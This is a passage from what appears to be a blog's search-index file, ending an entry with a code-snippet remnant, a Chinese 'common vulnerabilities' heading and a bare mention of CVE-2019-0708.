class="hljs-string">&#x27;password&#x27;</span><br></code></pre></td></tr></table></figure><h6 id="通用漏洞-1"><a href="#通用漏洞-1" class="headerlink" title="通用漏洞"></a>通用漏洞</h6><p>CVE-2019-0708</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
